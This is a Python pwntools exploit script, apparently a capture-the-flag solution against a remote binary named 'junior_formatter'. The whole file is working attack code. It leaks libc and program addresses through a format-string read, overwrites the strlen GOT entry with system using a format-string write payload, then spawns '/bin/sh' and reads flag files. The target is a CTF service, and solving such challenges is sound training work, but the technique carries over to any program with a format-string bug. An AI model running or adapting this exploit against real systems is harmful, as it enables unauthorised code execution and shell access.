#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './junior_formatter_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.remote'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '52.59.124.14', 5031

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'>>', b'%25$p||%27$p')
    io.recvuntil(b'input:\n')
    leak = io.recvline().split(b'||')    

    libc.address = int(leak[0], 16) - 0x29d90
    elf.address = int(leak[1], 16) - 0x12bb

    io.sendlineafter(b'(r)?', b'r')
    payload = fmtstr_payload(10, {elf.got['strlen']: libc.sym['system']})
    io.sendafter(b';)\n>>', payload)

    # gotta retry multiple times
    io.sendline(b'/bin/sh')
    io.sendline(b'cat flag*')

    success('libc base: %#x', libc.address)
    success('elf base: %#x', elf.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()